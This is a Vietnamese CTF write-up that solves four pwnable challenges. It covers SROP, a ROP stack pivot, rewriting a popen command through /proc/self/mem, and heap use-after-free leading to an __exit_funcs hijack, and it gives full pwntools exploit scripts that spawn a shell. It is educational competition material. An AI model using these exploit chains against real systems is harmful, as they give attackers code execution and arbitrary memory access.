---
title: 'W1Playground - pwnable write-up'
description: 'Write-ups for all 4 challenge in W1Playground'
date: 2024-03-30
tags:
   - 'CTF'
   - 'PWN'
   - '2024'
---

---
## Hello, World !
Xem qua binary và checksec:
```
$ file chall 
chall: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, stripped
$ checksec chall
[*] '/home/an3ii/W1/hello_world/chall'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
$ ./chall 
aaaaaaaaaaaaaaaaaaaaaaaa
Hello aaaaaaaaaaaaaaaaaaaaaaaa
$ ./chall 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Segmentation fault (core dumped)
```
Đúng như mô tả của challenge, đây là một program hello world, và có xảy ra buffer overflow
### Reversing
Assembly code khi reverse ra assembly
```nasm
public start
start proc near
call    sub_8049000
mov     esi, eax
mov     edi, ecx
mov     ebx, 1          ; fd
mov     ecx, offset unk_804A000 ; addr
mov     edx, 6
mov     eax, 4
int     80h             ; LINUX - sys_write
mov     ecx, edi        ; addr
mov     edx, esi
mov     eax, 4
int     80h             ; LINUX - sys_write
xor     ebx, ebx        ; status
mov     eax, 1
int     80h             ; LINUX - sys_exit

sub_8049000 proc near
sub     esp, 80h
mov     ebx, 0          ; fd
mov     ecx, esp        ; addr
mov     edx, 1000h
mov     eax, 3
int     80h             ; LINUX - sys_read
add     esp, 80h
ret
```
Program read và write chỉ sử dụng syscall. Ngoài ra file ELF stripped không có link bất kì một file libc nào vào.
```
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start      End        Offset     Perm Path
0x08048000 0x08049000 0x00000000 r-- /home/an3ii/W1/hello_world/chall
0x08049000 0x0804a000 0x00001000 r-x /home/an3ii/W1/hello_world/chall
0x0804a000 0x0804b000 0x00002000 rw- /home/an3ii/W1/hello_world/chall
0xf7ff8000 0xf7ffc000 0x00000000 r-- [vvar]
0xf7ffc000 0xf7ffe000 0x00000000 r-x [vdso]
0xfffdd000 0xffffe000 0x00000000 rw- [stack]
```
Dễ thấy thì bug của chương trình xảy ra ở syscall read. Input được read vào ở (ebp - 0x80) nhưng đọc vào tận 0x1000 bytes. Ta có thể dễ dàng overflow vào flow của chương trình.

Ở đây không có libc nên không thể syscall('/bin/sh'). Việc rop chain để syscall cũng không dễ dàng vì không có gadget cho ebx.

Nên giải pháp ở đây là SROP.
### Sigreturn Oriented Programming - SROP
Giải thích một chút về SROP thì SROP sử dụng một syscall là sigreturn(). sigreturn() là hàm được gọi khi một process tiếp tục chạy sau khi bị dừng bởi signal handler. sigreturn() sẽ lấy một đoạn của stack để làm sigcontext - ở đó mỗi một dword sẽ tương ứng với 1 register. Khi sigreturn() được gọi, các register sẽ được gán với giá trị tương ứng của nó trên frame.
```c
# ifdef __i386__
struct sigcontext {
	__u16				gs, __gsh;
	__u16				fs, __fsh;
	__u16				es, __esh;
	__u16				ds, __dsh;
	__u32				edi;
	__u32				esi;
	__u32				ebp;
	__u32				esp;
	__u32				ebx;
	__u32				edx;
	__u32				ecx;
	__u32				eax;
	__u32				trapno;
	__u32				err;
	__u32				eip;
	__u16				cs, __csh;
	__u32				eflags;
	__u32				esp_at_signal;
	__u16				ss, __ssh;
	struct _fpstate __user		*fpstate;
	__u32				oldmask;
	__u32				cr2;
};
```
Sigcontext của 32 bit ELF. 
### Ý tưởng
Chúng ta có thể overflow vào tận 0x1000 bytes đằng sau stack, nghĩa là chúng ta có thể đặt một fake sigcontext khi gọi sigreturn bằng rop chain. Fake sigcontext được setup sao cho tương ứng với lệnh execve("/bin/sh", 0) - eax = 0xb, ebx = &"/bin/sh", ecx = 0

Tuy nhiên, "/bin/sh" chưa có sẵn trong ELF, nên mình sẽ tự tạo "/bin/sh" ở một chỗ không có PIE.

Việc setup syscall number có thể được thực hiện thông qua return value của read - số byte read được. Gadget gọi syscall đã có trong program.

Tóm lại, toàn bộ quá trình exploit là nhập payload để thực hiện sigreturn, tạo một sigcontext để thực hiện read vào một vị trí cố định, rồi gọi sigreturn lần 2 để gọi execve("/bin/sh").

### Full Exploit
```python
from pwn import *

#Important addresses and gadgets
readadd = 0x08049000
writeadd = 0x08049020
stack_size = 0x80
sysc = 0x08049017
memset = 0x8048000
sigret_num = 173
entry_point = 0x8048060
writable = 0x0804a500

context.arch = "i386"
context.log_level = 'debug'

chall = remote('chall.w1playground.com', *)

#Setup sigcontext
frame = SigreturnFrame(kernel = 'amd64')
frame.eax = 0x3
frame.ebx = 0
frame.ecx = writable # read(0,writeble, 0x500)
frame.edx = 0x500
frame.eip = sysc
frame.esp = writable + 8 - 0x80 # -0x80 vì gadgets int 0x80 theo sau bởi sub ebp, 0x80; ret

payload = b'A'*0x80 + p32(readadd)+ p32(sysc)  + bytes(frame) 

#Send sigcontext và gadget read 
chall.send(payload)
time.sleep(0.5)

#Read lần 2 để đạt được eax = 119 = syscall_num of sigreturn
chall.send(b'A'*119) 
time.sleep(0.5)

#Sigcontext lần 2
frame2 = SigreturnFrame(kernel = 'amd64')
frame2.ebx = 0x0804a500 #Chỗ sẽ viết "/bin/sh" vào
frame2.eax = 0xb
frame2.eip = sysc  #execve("/bin/sh")

payload = b'/bin/sh\x00' + p32(readadd)+ p32(sysc) + bytes(frame2) 
chall.send(payload)
time.sleep(0.5)
chall.send(b'A'*116 + b'/bi') #eax = 119 - Viết lại "/bi" vì bị overwrite
chall.interactive()
```
---
## Feedback

Xem qua binary và checksec
```
$ file feedback 
feedback: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=03d655736af96457ea1f8cb5165a9b47f2f946fe, not stripped
$ checksec feedback
[*] '/home/an3ii/W1/feedback_pulic/feedback'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
$ ./feedback 
Hello! Tell me your name plz
Your name: aaaaa
Hello aaaaa

Are you enjoying w1 championship?
1. Yes
2. Absolutely
3. Of course
4. Nah
You choice: 4

Oh, could you tell us what needs to be improved?
Your feedback: aaaaaaaaaaaaa
```
### Reversing
```C
__int64 nah()
{
  __int64 v1[10]; // [rsp+0h] [rbp-50h] BYREF

  memset(v1, 0, sizeof(v1));
  puts("\nOh, could you tell us what needs to be improved?");
  printf("Your feedback: ");
  return __isoc99_scanf("%80s", v1);
}
```
Bug của chương trình nằm ở hàm scanf. v1 nằm ở (rbp - 80) và scanf đúng 80 bytes, nhưng sẽ có 1 byte bị overflow thành 0x00. Cộng thêm với ASLR là đủ để thực hiện rop chain khi may mắn 2 byte cuối rbp - 80 rơi vào 0x00.
```
#Before input
0x401454 → nah()
[#1] 0x401554 → main()
─────────────────────────────
gef➤  x $rbp
0x7fffffffde50:	0x00007fffffffde70

#After input
[#0] 0x401459 → nah()
[#1] 0x401554 → main()
──────────────────────────────
gef➤  x $rbp
0x7fffffffde50:	0x00007fffffffde00
```
### Ý tưởng
Để gọi được exec("/bin/sh",0,0) thì trước hết phải leak libc và đồng thời thực hiện stack pivot, vì process đang có ASLR. Có một gadget rất hợp lý để thực hiện việc này:
```
call   0x401100 <__isoc99_scanf@plt>
nop
leave  
ret   
```
Sau khi scanf input (rop chain) của mình vào một chỗ mới sẽ pivot được stack luôn.

Mình sẽ tạo rop chain để set rdi là puts tại .got.plt để leak ra địa chỉ của puts, rồi đổi argv[2] của scanf thành một chỗ writable, sau đó là gadget scanf - leave - ret.
```python
payload1 = p64(0)
payload1 += p64(pop_rdi) #rdi = puts_got
payload1 += p64(puts_got)
payload1 += p64(puts_plt) #call puts
payload1 += p64(pop_rsi_r15) #rsi = writable
payload1 += p64(writable)
payload1 += p64(0)
payload1 += p64(pop_rbp)  
payload1 += p64(writable)
payload1 += p64(scanf_again) #scanf("%80s", writable)
```
Sau khi leak được libc thì phần rop chain cho lần scanf thứ 2 là đơn giản.
```python
payload2 = p64(0)
payload2 += p64(pop_rdi)
payload2 += p64(binsh)
payload2 += p64(pop_rsi_r15)
payload2 += p64(0)
payload2 += p64(0)
payload2 += p64(ret)
payload2 += p64(execve) #execve("/bin/sh", 0)
```

### Full exploit

```python
from pwn import *

def padding(s):
    return s + b'A'*(80-len(s))

libc = ELF('/home/an3ii/W1/libc.so.6')
#Important addresses and gadgets
puts_plt = 0x4010a0
puts_got = 0x403fb8
printf_got = 0x403fc0
pop_rdi = 0x4015d3
ret = 0x40101a
main = 0x40145c
pop_rsi_r15 = 0x4015d1
scanf_again = 0x401448
leave = 0x4012e2
writable = 0x404500
pop_rbp = 0x4011dd

chall = remote('chall.w1playground.com',*)

#First payload
payload1 = p64(0)
payload1 += p64(pop_rdi)
payload1 += p64(puts_got)
payload1 += p64(puts_plt)
payload1 += p64(pop_rsi_r15)
payload1 += p64(writable)
payload1 += p64(0)
payload1 += p64(pop_rbp)
payload1 += p64(writable)
payload1 += p64(scanf_again)


chall.recvuntil(b'Your name: ')
chall.sendline(b'4')
chall.recvuntil(b'You choice: ')
chall.sendline(b'4')
chall.recvuntil(b'Your feedback: ')
chall.sendline(padding(payload1))
try:
    leak = chall.recvuntil(b'\n')
except:
    print('_______________TRY_AGAIN_______________')
    print(chall.recvall())

#Calculate libc address
leak = u64(leak.strip().ljust(8,b'\x00'))
base_libc = leak - libc.sym['puts']
log.info('Base libc: ',hex(base_libc))
binsh = base_libc + next(libc.search(b'/bin/sh\x00'))
execve = base_libc + libc.sym['execve']

#Second payload
payload2 = p64(0)
payload2 += p64(pop_rdi)
payload2 += p64(binsh)
payload2 += p64(pop_rsi_r15)
payload2 += p64(0)
payload2 += p64(0)
payload2 += p64(ret)
payload2 += p64(execve)

chall.sendline(padding(payload2))
chall.interactive()
```
---
## OPEN-READ-WRITE

Xem qua binary và checksec:
```
$ checksec chall
[*] '/home/an3ii/W1/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
$ file chall
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0d2b483d477c9aaf86813e8972f0c87d85857f2a, for GNU/Linux 3.2.0, stripped
$ ./chall 
./chall <PORT>
$ ./chall 8888
Server listening on localhost:8888
```
Khi exec file thì file sẽ mở một socket với port là argv[1] cho chúng ta có thể connect vào.
### Reversing
Vì pseudocode của binary trong IDA rất dài nên mình sẽ tóm gọn lại flow của chương trình.
Chương trình cho phép thực thi 3 lệnh: ls, read và write dưới một input prompt:
```C
if ( v5 == 0x1339 )
    {
      ls(fd);
    }

...
if ( v5 == 0x1337 )
      {
        ptr = malloc(120uLL);
        if ( !ptr )
          goto LABEL_12;
        if ( (unsigned int)recv(fd, ptr, 120uLL, 0x4000) != 120 )
          break;
        self_write(fd, (__int64)ptr)
...
if(v5 == 0x1338)
ptra = malloc(120uLL);
        if ( !ptra )
        {
LABEL_12:
          perror("handle_client::malloc");
          goto LABEL_21;
        }
        if ( (unsigned int)recv(fd, ptra, 120uLL, 0x4000) != 120 )
          break;
        self_read(fd, (__int64)ptra);
        free(ptra);
```
Hint của challenge:
> Think about /proc/self
> How can one process see the memory map of another one (on Linux)?
>How can one process directly modify the memory of another one (on Linux)?
>Also remember that these hints are related to the previous hint

Mình bắt đầu research thì tìm được một vài thông tin: /proc/self là /proc là một directory chứ những thông tin của các process đang chạy trong máy tính. /proc/self là một "magic link", nghĩa là khi bất kì process nào access đến nó, nó sẽ symlink đến /proc/pid của process đó. 

Ngoài ra, /proc/pid/maps một file chứa thông tin về mmapped memory của process, còn /proc/pid/mem là file chứa toàn bộ memory của process.
### Ý tưởng
Vậy là mình có thể viết được vào bất kì đâu vào trong memory của process, nhưng chuyện trước tiên là phải leak được base của process vì file PIE.
```python
chall.send(p64(r))
chall.send(payload(filename=b'../../../../proc/self/maps'))
base_text = chall.recvuntil(b'-')
base_text = int(base_text[0:12],16)
```
Câu hỏi quan trọng nhất: viết cái gì và viết vào đâu? Ý tưởng của mình đầu tiên là viết shellcode vào một đoạn code nó chắc chắn sẽ chạy qua. Cách đó mặc dù... cũng hoạt động nhưng mình quên mất rằng mình đang connect vào socket và không thể send được gì nếu như đã spawn được shell. 

Còn một chỗ nữa mình chưa đụng vào: ls. 
``
stream = popen("ls -lh files/", "r");``

Mình có thể overwrite "ls -lh files/h" thành "cat ~/flag*" là có thể lấy được flag rồi.

### Full Exploit
```python=
from pwn import *

def payload(filename, lseek = 0, sz = 0x1000):
    return b'0000' + filename + b'\x00'*(104 - 4 - len(filename)) + p64(lseek) + p64(lseek + sz)

chall = remote('chall.w1playground.com', *)

#input prompts for read, write, ls
w = 0x0000133700006942
r = 0x0000133800006942
ls = 0x0000133900006942

#Read the vmmap
chall.send(p64(r))
chall.send(payload(filename=b'../../../../proc/self/maps'))
base_text = chall.recvuntil(b'-')
base_text = int(base_text[0:12],16)

#Modify "ls -lh files/" to "cat ~/flag*"
chall.send(p64(w))
ls = 0x21f9
modify = b'cat ~/flag*\x00'
chall.send(payload(filename=b'../../../../proc/self/mem', lseek= base_text+ ls,sz = len(modify) ))

chall.send(modify)
chall.send(p64(ls))
chall.interactive()
```
## IluvCPP
![image](https://hackmd.io/_uploads/SJD0AoeWR.png)
Full đồ full giáp

Program cho mình các option add, get info, name, delete (bỏ qua race vì nó khá vô dụng). 
![image](https://hackmd.io/_uploads/HJ6fyheWA.png)
Đây là dạng một dạng bài heap điển hình khi cho các option liên quan đến malloc, free, puts... Tuy nhiên, cách hoạt động của những hàm này khác với những bài heap bình thường.

Vì là bài heap nên mình cần quan tâm một xíu đến libc. Build và run docker từ Dockerfile đề cho thì binary này sử dụng libc-2.35. Từ bản libc-2.34 trở đi thì malloc không còn `__free_hook` hay `__malloc_hook` nữa.
### Reversing
#### Add a new car
```c    
int add_car()
{
  int v1; // eax
  int v2; // eax
  __int64 v3; // [rsp+8h] [rbp-18h]
  __int64 v4; // [rsp+10h] [rbp-10h]
  int v5; // [rsp+1Ch] [rbp-4h]

  v5 = get_index();
  if ( ptrs[v5] )
    return printf("Already has a car!\n");
  ptrs[v5] = operator new(0x40uLL);
  v3 = ptrs[v5];
  v1 = rand();
  sub_1350(v3, v1 % 10 - 0x2152411021524111LL);
  v4 = ptrs[v5];
  v2 = rand();
  sub_1370(v4, (double)v2 / 2147483647.0 * 1337.42);
  return printf("Added!\n");
}
```
Option này malloc 1 chunk với size là 0x40 byte. Nó không malloc lại nếu như đã có chunk ở ptr đó. Hàm `get_index()` cho ta biết có thể malloc tối đa 10 chunks khác nhau.
```c    
_int64 get_index()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Idx: ");
  __isoc99_scanf("%u", &v1);
  getchar();
  if ( v1 >= 10 )
  {
    printf("Out of bond!\n");
    exit(1);
  }
  if ( __readfsqword(0x28u) != v2 )
    JUMPOUT(0x19F6LL);
  return v1;
}
```
#### Name a car
```c    
int name_car()
{
  int result; // eax
  void *v1; // rax
  char v2; // [rsp+Bh] [rbp-5h]
  int v3; // [rsp+Ch] [rbp-4h]

  v3 = get_index();
  if ( !ptrs[v3] )
    return printf("There is no car!\n");
  if ( !sub_1390(ptrs[v3]) )
    return sub_12C0(ptrs[v3]);
  printf("Do you want to edit it's name? (Y/n): ");
  v2 = getchar();
  getchar();
  if ( v2 == 'y' || (result = v2, v2 == 'Y') )
  {
    v1 = (void *)sub_1390(ptrs[v3]);
    return read(0, v1, 0x40uLL);
  }
  return result;
}
```
Hàm này check xem `chunk[2]` trước. Nếu `chunk[2] == 0` thì sẽ malloc 1 chunk và gán địa chỉ của chunk đó cho `chunk[2]` và read tối đa 0x40 byte input vào trong chunk đó. Nếu không thì nó sẽ không malloc và read vào 'địa chỉ' đã có sẵn tại `ptr[2]`.
#### Get info
Đơn giản là output ra các giá trị `chunk[0]`, `chunk[1]` và `*chunk[2]`.
#### Delete a car
```c    
_QWORD *delete_car()
{
  _QWORD *result; // rax
  void *v1; // [rsp+0h] [rbp-10h]
  int v2; // [rsp+Ch] [rbp-4h]

  v2 = get_index();
  v1 = (void *)ptrs[v2];
  if ( v1 )
  {
    sub_13F0(v1);
    operator delete(v1);
  }
  result = ptrs;
  ptrs[v2] = 0LL;
  return result;
}
```
Hàm này sẽ free `chunk[2]` trước, sau đó mới free `ptr`. Sau khi free xong thì chỉ xóa giá trị trên `ptr` mà không xóa giá trị `chunk[2]`. Đó cũng là bug to nhất của program này.
### Analysing
Trong trường hợp mình malloc `ptrs[0]`, sau đó gọi name và delete, ta có 2 chunk nằm trong tcache. `ptr[0]` nằm trước, `chunk[0][2]` nằm sau. Khi malloc lại `chunk[0]`, nó malloc cho `chunk[0]` tại vị trí ban đầu. Giờ mình malloc `chunk[1]`, nó sẽ malloc `chunk[0][2]` cho `chunk[1]`. Mà mình có thể read hoặc write vào `chunk[0][2]` do nó chưa bị clear khi free, nên mình có thể kiểm soát được `chunk[1][2]`, mà tại đó là địa chỉ mà `chunk[1]` có toàn quyền read-write vào. Từ đó mình có thể thực hiện bất kì arbitrary read - write nào.
```
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555559000
Size: 0x290 (with flag bits: 0x291)

Allocated chunk | PREV_INUSE
Addr: 0x555555559290
Size: 0x11c10 (with flag bits: 0x11c11)

Allocated chunk | PREV_INUSE
Addr: 0x55555556aea0
Size: 0x50 (with flag bits: 0x51)

Allocated chunk | PREV_INUSE
Addr: 0x55555556aef0
Size: 0x50 (with flag bits: 0x51)

Top chunk | PREV_INUSE
Addr: 0x55555556af40
Size: 0xf0c0 (with flag bits: 0xf0c1)
pwndbg> x/32gx 0x55555556aea0
0x55555556aea0: 0x0000000000000000      0x0000000000000051
0x55555556aeb0: 0x408985d7f52ef4a6      0xdeadbeefdeadbef8
0x55555556aec0: 0x000055555556af00      0x0000000000000000
0x55555556aed0: 0x0000000000000000      0x0000000000000000
0x55555556aee0: 0x0000000000000000      0x0000000000000000
0x55555556aef0: 0x0000000000000000      0x0000000000000051
0x55555556af00: 0x40928d70adaacccd      0xdeadbeefdeadbef0
0x55555556af10: 0x000a616161616161      0x0000000000000000
0x55555556af20: 0x0000000000000000      0x0000000000000000
0x55555556af30: 0x0000000000000000      0x0000000000000000
0x55555556af40: 0x0000000000000000      0x000000000000f0c1
```
`chunk[1][2]` đã bị overflow bởi input.
### Approach
Vì binary này full đồ full giáp nên phải leak được một số thứ để có thể read - write được vào. Hai thứ mình cần leak là địa chỉ cơ sở của heap và libc.
#### Leaking heap base address
Libc-2.35 có sử dụng safe-linking, nên chỉ cần 1 lần delete là mình đã leak được. Khi free `chunk[0][2]`, tại địa chỉ của `chunk[0][2]` trỏ đến sẽ được xor với `&ptr >> 12` rồi gán vào đó. Gọi malloc `ptrs[0]` rồi get info là có thể leak ra được giá trị đó, sau đó `<<` 12 lại là có được heap base. Không cần quan tâm 3 byte bị bỏ khi >> 12, vì base của heap lúc nào cũng chẵn 0x1000.
```python
malloc(b'0')
edit(b'0', b'A'*48, False)
free(b'0')
malloc(b'0')
heap_key = leak(b'0')
```
### Leaking libc base address
Có full RELRO nên không thể malloc được chunk ở trong GOT để leak được address. Cách còn lại là tạo một fake chunk to để đưa nó vào unsorted bin.
Mình thực hiện các bước sau
1. Sau khi malloc `ptrs[1]`, sửa giá trị `sz` tại `(ptrs[1] - 0x8)` thành một số lớn hơn 1032 (tcache chứa chunk to nhất là 1032 byte). Mình chọn 0x481
2. Vì khi free, thuật toán có check xem là chunk tiếp theo của chunk đó có bit `prev_inuse` được set. Nếu không sẽ abort lập tức. Vì vậy mình phải đưa được một giá trị vào `(ptrs[1] + 0x480)`. Có 2 cách làm chuyện này. 1 là arbitrary write, 2 là malloc rồi name với giá trị là p64(0x31) và cầu may nó sẽ đến được địa chỉ mong muốn. Mình làm cách 2 =))).
3. Gọi free `ptr[1]`, khi đó `chunk[1][0]` là bk_ptr, trỏ ngược về main_arena trong libc. Gọi get_info của 0 là lấy được địa chỉ.
```python
edit(b'0', p64(0)*2 + p64(size + (heap_key << 12)), True)
malloc(b'1')
edit(b'1',p64(0) + p64(0x481) + p64(0)*3, True )
for i in range(2,9):
    malloc(str(i).encode())
    edit(str(i).encode(), p64(0x31)*8, False)

free(b'1')

libc_leak = leak(b'0')
libc_base = libc_leak - libc_offset
```
#### __exit_funcs
Không có `__malloc_hook` hoặc `__free_hook` nên cách duy nhất để spawn được shell là ghi đè lên `__exit_funcs`. Khi exit thì program sẽ execute một số hàm đã được cài đặt trong `__exit_funcs`. 
Structure của `__exit_funcs`
```c    
enum
{
  ef_free,  /* `ef_free' MUST be zero!  */
  ef_us,
  ef_on,
  ef_at,
  ef_cxa
};
struct exit_function
  {
    /* `flavour' should be of type of the `enum' above but since we need
       this element in an atomic operation we have to use `long int'.  */
    long int flavor;
    union
      {
    void (*at) (void);
    struct
      {
        void (*fn) (int status, void *arg);
        void *arg;
      } on;
    struct
      {
        void (*fn) (void *arg, int status);
        void *arg;
        void *dso_handle;
      } cxa;
      } func;
  };
struct exit_function_list
  {
    struct exit_function_list *next;
    size_t idx;
    struct exit_function fns[32];
  };
```
Mình có thể đặt được địa chỉ của `system` vào `(*fn)` và địa chỉ của `/bin/sh` vào `*arg`. Với type thì mình chọn `cxa`. 
Nhưng có một điều là, giá trị tại `(*fn)` không phải là một địa chỉ, mà nó đã được mã hóa.
Mã hóa: `rol(pl_ptr ^ key, 0x11)`
Giải mã: `ror(enc_ptr,0x11)^key`
Trong `__exit_funcs` thường sẽ có một vài hàm có sẵn, nên mình dùng gdb để lấy offset của hàm đó và offset của `enc_ptr` mà nó decrypt ra được địa chỉ. Vậy là mình cũng có được `enc_ptr` và `pl_ptr` nên key sẽ là `key = ror(enc_ptr,0x11)^pl_ptr`. Từ đó mình encrypt địa chỉ của `/bin/sh` rồi đưa vào `(*fn)`.
```python
origin = 0x21c078
some_func = 0x3ef840
exit_func = 0x21bf00
malloc(b'9')
edit(b'2',p64(0)*2 + p64(libc_base+origin), True)
ct = leak_key(b'9')
log.info('Libc base: '+hex(libc_base))

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

def encrypt(v, key):
    return rol(v ^ key, 0x11, 64)
pt = some_func + libc_base
extracted_key = ror(ct, 0x11, 64) ^ pt
system_encrypted = encrypt(libc_base + libc.sym["system"], extracted_key)
edit(b'2', p64(0)*2 + p64(libc_base + exit_func), True )
edit(b'9', p64(0) + p64(1) + p64(4) + p64(system_encrypted) + p64(libc_base + next(libc.search(b'/bin/sh\x00'))) + p64(0), True )
```
### Full exploit
```python
from pwn import *
import sys 

nc = "chall.w1playground.com"
p = 59471

libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
context.binary = exe = ELF('./chall', )
context.log_level  = "debug"
if sys.argv[1] == "debug":
    chall = gdb.debug('./chall' )
if sys.argv[1] == "run":
    chall = process('./chall')
if sys.argv[1] == "connect":
    chall = remote(host = nc, port = p)
    

def malloc(idx):
    chall.sendlineafter(b'>', b'1')
    chall.sendlineafter(b'Idx: ', idx)

def leak(idx):
    chall.sendlineafter(b'>', b'2')
    chall.sendlineafter(b'Idx: ', idx)
    chall.recvuntil(b'Name: ')
    leaked = chall.recvline()
    return u64(leaked.strip().ljust(8,b'\x00'))
def leak_key(idx):
    chall.sendlineafter(b'>', b'2')
    chall.sendlineafter(b'Idx: ', idx)
    chall.recvuntil(b'Name: ')
    leaked = chall.recvline()
    leaked = leaked[0:8]
    return u64(leaked.strip().ljust(8,b'\x00'))

def free(idx):
    chall.sendlineafter(b'>', b'4')
    chall.sendlineafter(b'Idx: ', idx)

def edit(idx, data, yn : True | False):
    chall.sendlineafter(b'>', b'3')
    chall.sendlineafter(b'Idx: ', idx)
    if yn:
        chall.sendlineafter(b'): ', b'y')
        chall.sendline(data)
    else:
        chall.sendafter(b'Name: ' ,data)
 
# Some offset
size = 0xef0
libc_offset = 0x21ace0

# Get base of heap
malloc(b'0')
edit(b'0', b'A'*48, False)
free(b'0')
malloc(b'0')
heap_key = leak(b'0')
# Leaking libc
edit(b'0', p64(0)*2 + p64(size + (heap_key << 12)), True)
malloc(b'1')
edit(b'1',p64(0) + p64(0x481) + p64(0)*3, True )
for i in range(2,9):
    malloc(str(i).encode())
    edit(str(i).encode(), p64(0x31)*8, False)
free(b'1')

libc_leak = leak(b'0')
libc_base = libc_leak - libc_offset
#Retrieve some chunks for later use
for i in range(4,1,-1):
    free(str(i).encode())
malloc(b'2')
edit(b'2', b'A'*48, True)
free(b'2') 
malloc(b'2')
# Leaking key and overwrite __exit_funcs
origin = 0x21c078
some_func = 0x3ef840
exit_func = 0x21bf00
malloc(b'9')
edit(b'2',p64(0)*2 + p64(libc_base+origin), True)
ct = leak_key(b'9')
log.info('Libc base: '+hex(libc_base))

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

def encrypt(v, key):
    return rol(v ^ key, 0x11, 64)
pt = some_func + libc_base
extracted_key = ror(ct, 0x11, 64) ^ pt
system_encrypted = encrypt(libc_base + libc.sym["system"], extracted_key)
edit(b'2', p64(0)*2 + p64(libc_base + exit_func), True )
edit(b'9', p64(0) + p64(1) + p64(4) + p64(system_encrypted) + p64(libc_base + next(libc.search(b'/bin/sh\x00'))) + p64(0), True )
chall.interactive()
# Then call exit to get the shell
```
